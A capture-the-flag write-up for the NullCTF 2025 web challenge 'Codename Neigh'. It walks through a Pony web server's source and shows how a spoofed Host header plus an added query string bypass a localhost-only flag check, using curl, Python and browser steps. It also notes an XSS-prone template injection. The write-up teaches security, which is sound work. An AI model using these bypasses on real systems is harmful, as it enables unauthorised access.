# NullCTF 2025 - Codename Neigh Challenge Writeup

**Author:** xseven  
**Difficulty:** Very Easy  
**Category:** Web

**Challenge Description:**

> Beyond the known chronometers lies the Temporal Nexus. Within its databanks, a desperate message echoes: a time traveler's plea for his lost companion, Neigh, vanished into the mists of history. Explore restricted archives, consult paradox guides, and perhaps, lend your eyes to a search that spans epochs.
>
> http://public.ctf.r0devnull.team:3002/

---

## Intro

"Codename Neigh" is a web security challenge that explores access control vulnerabilities in a web application written in the Pony programming language. The challenge presents a themed interface about a "Temporal Nexus" where a time traveler searches for their lost companion named "Neigh."

The application implements a flag endpoint protected by what appears to be a localhost-only access control mechanism. However, this protection contains two critical flaws: reliance on client-controlled HTTP headers and improper path validation logic. Players must identify and exploit these vulnerabilities to bypass the access controls and retrieve the flag.

---

## Initial Analysis

### Exploring the Application

Upon accessing the challenge URL, we're presented with a themed web interface featuring:

1. **Homepage** (`/`) - A "Temporal Nexus" themed landing page
2. **Pony Information** (`/pony`) - Information about the lost companion
3. **Report Form** (`/pony/find`) - A POST endpoint for submitting sighting reports
4. **Flag Endpoint** (`/flag`) - The protected endpoint containing our objective

Initial attempts to directly access `/flag` return:

```
[REDACTED]
```

This indicates that the flag is protected and requires some form of bypass.

### Analyzing the Source Code

The challenge provides access to the source code, which is crucial for understanding the application's logic. The main application file is `main.pony`, written in the Pony programming language.

Let's examine the key components:

#### Application Structure (`main.pony`)

```pony
use "net"
use "files"
use "jennet"
use "http_server"
use "collections"



actor Main
  new create(env: Env) =>
    let tcplauth: TCPListenAuth = TCPListenAuth(env.root)
    let fileauth: FileAuth = FileAuth(env.root)

    let server =
      Jennet(tcplauth, env.out)
        .> serve_file(fileauth, "/", "public/index.html")
        .> serve_file(fileauth, "/pony", "public/pony.html")
        .> post("/pony/find", PonyFind(fileauth))
        .> get("/flag", F(fileauth))
        .> get("/:name", H(fileauth))
        .serve(ServerConfig(
          where host' = "0.0.0.0",
                port' = "8081",
                max_concurrent_connections' = 10000
        ))

    if server is None then
      env.out.print("bad routes!")
    end



class F is RequestHandler
  let _fileauth: FileAuth
  
  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun apply(ctx: Context): Context iso^ =>
    var conn: String = ""
    var body = "[REDACTED]".array()
    
    try
      conn = ctx.request.header("Host") as String
    end
    
    let path: String = ctx.request.uri().string()

    if (conn == "127.0.0.1") and (path != "/flag") and (path != "flag") then
      let fpath = FilePath(_fileauth, "public/flag.html")
      with file = File(fpath) do
        body = file.read_string(file.size()).string().array()
      end
    end

    ctx.respond(
      StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
      body
    )
    consume ctx



class H is RequestHandler
  let _fileauth: FileAuth
  
  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun apply(ctx: Context): Context iso^ =>
    try
      let name = URLEncode.decode(ctx.param("name"))?
      let body = "".join(
        [ "Not found"; if name != "" then " " + name else "" end; "!"
        ].values()).array()
      ctx.respond(
        StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
        body
      )
    else
      let body = "Error".array()
      ctx.respond(
        StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
        body
      )
    end
    consume ctx



class PonyFind is RequestHandler
  let _fileauth: FileAuth
  
  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun apply(ctx: Context): Context iso^ =>
    let body' = ctx.body
    let form_data = recover val FormData.parse(body'.string()) end
    
    var html: String = ""
    if form_data.is_valid() then
      let path = FilePath(_fileauth, "public/report.html")
      with file = File(path) do
        var content: String ref = file.read_string(file.size()).string()
        form_data._inject_form_data(content)
        html = content.string()
      end
    else
      let path = FilePath(_fileauth, "public/error.html")
      with file = File(path) do
        html = file.read_string(file.size()).string()
      end
    end

    let html_arr = html.array()
    ctx.respond(
      StatusResponse(StatusOK, [("Content-Length", html_arr.size().string())]),
      html_arr
    )
    consume ctx



class FormData
  let data: Map[String, String] = Map[String, String]
  
  new val parse(body: String) =>
    for pair in body.split_by("&").values() do
      let kv = pair.split_by("=")
      if kv.size() == 2 then
        try
          data(kv(0)?) = kv(1)?
        end
      end
    end
  
  fun is_valid(): Bool =>
    data.contains("reporterName") and
    data.contains("sightingLocation") and
    data.contains("contactMethod") and
    data.contains("message")
  
  fun get_or_else(key: String, default: String = ""): String =>
    try data(key)? else default end
  
  fun apply(key: String): String =>
    try data(key)? else "" end

  fun extract_template_vars(s: String ref): Array[String] ref^ =>
    let vars: Array[String] ref = recover Array[String] end
    var pos: ISize = 0
    
    try
      let len = s.size().isize()

      while pos < len do
        let start = s.find("{{", pos)?
        let end_pos = s.find("}}", start + 2)?

        var var_name = s.substring(start + 2, end_pos).clone()
        if var_name isnt None then
          var_name.strip()
          if var_name.size() > 0 then
            vars.push(consume var_name)
          end
        end
        
        pos = end_pos + 2
      end
    end
    
    consume vars

  fun _inject_form_data(html: String ref) =>
    let vars = extract_template_vars(html)
    for name in vars.values() do
      if data.contains(name) then
        html.replace("{{" + name + "}}", try data(name)? else "{{" + name + "}}" end)
      end
    end

```

The application uses the Jennet web framework and defines several routes:
- Static file serving for `/` and `/pony`
- POST handler for `/pony/find`
- GET handler for `/flag` (class `F`)
- Catch-all GET handler for `/:name` (class `H`)

---

## Vulnerability Analysis

### The Flag Handler (Class F)

The critical vulnerability lies in the flag handler implementation:

```pony
class F is RequestHandler
  let _fileauth: FileAuth
  
  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun apply(ctx: Context): Context iso^ =>
    var conn: String = ""
    var body = "[REDACTED]".array()
    
    try
      conn = ctx.request.header("Host") as String
    end
    
    let path: String = ctx.request.uri().string()

    if (conn == "127.0.0.1") and (path != "/flag") and (path != "flag") then
      let fpath = FilePath(_fileauth, "public/flag.html")
      with file = File(fpath) do
        body = file.read_string(file.size()).string().array()
      end
    end

    ctx.respond(
      StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
      body
    )
    consume ctx
```

#### Vulnerability #1: Host Header Spoofing

The handler extracts the `Host` header from the request:

```pony
try
  conn = ctx.request.header("Host") as String
end
```

This value is then checked in the conditional:

```pony
if (conn == "127.0.0.1") and ...
```

**Problem:** The `Host` header is entirely client-controlled. An attacker can set this header to any value they want, including "127.0.0.1". This check does not verify that the request actually originated from localhost; it only checks what the client claims in the header.

**Impact:** The first part of the access control can be trivially bypassed by setting `Host: 127.0.0.1` in the request.

#### Vulnerability #2: Path Logic Flaw

The handler also checks the request path:

```pony
let path: String = ctx.request.uri().string()

if (conn == "127.0.0.1") and (path != "/flag") and (path != "flag") then
```

**Problem:** The logic requires that the path is NOT equal to "/flag" or "flag" for the flag to be revealed. This appears to be a logic error in the access control implementation.

Since this handler is registered for the `/flag` route, a normal request to `/flag` would have `path == "/flag"`, causing the condition to fail and return "[REDACTED]".

However, when query parameters are appended to the URL (e.g., `/flag?x` or `/flag?bypass`), the URI includes these parameters, making the path something like `/flag?x`, which is NOT equal to "/flag".

**Impact:** By appending any query parameter to the `/flag` endpoint, we can satisfy the flawed path check.

### The Flag File

The flag is stored in `public/flag.html`:

```html
<!DOCTYPE html>
<html lang="en">
<body>
    <p>No pony here but you did find the flag:</p>
    <br>
    <b>nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(}</b>
</body>
</html>
```

---

## Exploitation

### Attack Requirements

To successfully retrieve the flag, we need to:

1. Set the `Host` header to "127.0.0.1"
2. Append a query parameter to the `/flag` path to make it not equal to "/flag"

### Method 1: Using cURL

The simplest method is using `curl` with a custom Host header:

```bash
curl -H "Host: 127.0.0.1" "http://public.ctf.r0devnull.team:3002/flag?bypass"
```

**Response:**

```html
<!DOCTYPE html>
<html lang="en">
<body>
    <p>No pony here but you did find the flag:</p>
    <br>
    <b>nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(}</b>
</body>
</html>
```

**Flag:** `nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(}`

### Method 2: Using Python with Requests

For a more programmatic approach, we can use Python's `requests` library:

```python
import requests

url = "http://public.ctf.r0devnull.team:3002/flag?bypass=true"
headers = {
    "Host": "127.0.0.1"
}

response = requests.get(url, headers=headers)

print(response.text)
```

**Output:**

```html
<!DOCTYPE html>
<html lang="en">
<body>
    <p>No pony here but you did find the flag:</p>
    <br>
    <b>nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(}</b>
</body>
</html>
```

### Method 3: Using Browser Developer Tools

For those who prefer browser-based exploitation:

1. Open the browser's Developer Tools (F12)
2. Navigate to the Network tab
3. Visit `http://public.ctf.r0devnull.team:3002/flag?x`
4. Right-click on the request and select "Edit and Resend" (or equivalent)
5. Modify the `Host` header to `127.0.0.1`
6. Resend the request
7. View the response containing the flag

---

## Additional Observations

### The Form Handler Vulnerability

While not necessary for solving the challenge, the `PonyFind` handler also contains an interesting vulnerability - Server-Side Template Injection (SSTI):

```pony
class PonyFind is RequestHandler
  let _fileauth: FileAuth
  
  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun apply(ctx: Context): Context iso^ =>
    let body' = ctx.body
    let form_data = recover val FormData.parse(body'.string()) end
    
    var html: String = ""
    if form_data.is_valid() then
      let path = FilePath(_fileauth, "public/report.html")
      with file = File(path) do
        var content: String ref = file.read_string(file.size()).string()
        form_data._inject_form_data(content)
        html = content.string()
      end
    else
      let path = FilePath(_fileauth, "public/error.html")
      with file = File(path) do
        html = file.read_string(file.size()).string()
      end
    end

    let html_arr = html.array()
    ctx.respond(
      StatusResponse(StatusOK, [("Content-Length", html_arr.size().string())]),
      html_arr
    )
    consume ctx
```

The `_inject_form_data` method performs template replacement:

```pony
fun _inject_form_data(html: String ref) =>
  let vars = extract_template_vars(html)
  for name in vars.values() do
    if data.contains(name) then
      html.replace("{{" + name + "}}", try data(name)? else "{{" + name + "}}" end)
    end
  end
```

This replaces template variables like `{{reporterName}}` with user-supplied data without proper sanitization, potentially allowing HTML injection or XSS attacks. However, this vector is not required to obtain the flag.

## Conclusion

The "Codename Neigh" challenge demonstrates two common web security vulnerabilities:

1. **Trusting Client-Controlled Data:** The application trusted the `Host` header for access control decisions, which is entirely under the attacker's control.

2. **Logic Errors in Access Control:** The inverted path check logic created an exploitable condition where adding query parameters bypassed the protection.

Both vulnerabilities had to be exploited together to retrieve the flag, making this an educational example of how multiple small mistakes can combine to create a significant security issue.

Pwned!

KOREONE
